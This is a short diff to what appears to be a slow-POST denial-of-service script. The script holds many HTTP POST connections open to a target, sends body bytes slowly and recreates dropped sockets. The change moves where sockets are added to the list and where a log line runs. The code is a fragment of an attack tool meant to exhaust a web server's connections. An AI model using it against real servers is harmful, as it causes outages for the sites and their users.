@@ -232,9 +232,10 @@ def main():
             http_request = generate_http_req("POST", file_path, list_of_headers)
             http_request += "\r\n"
             s.sendall(http_request.encode("utf-8"))
+            if s:
+               list_of_sockets.append(s)
          except socket.error:
             break
-         list_of_sockets.append(s)
 
       while True:            
          print("Sending byte in HTTP POST body... Socket count: " + str(len(list_of_sockets)))
@@ -246,8 +247,8 @@ def main():
                list_of_sockets.remove(s)
 
          for i in range(socket_count - len(list_of_sockets)):
-            logger.log("Recreating socket...")
             try:
+               logger.log("Recreating socket...")
                s = init_socket(host, port, tls)
                list_of_headers = []
                list_of_headers.append(host_header)
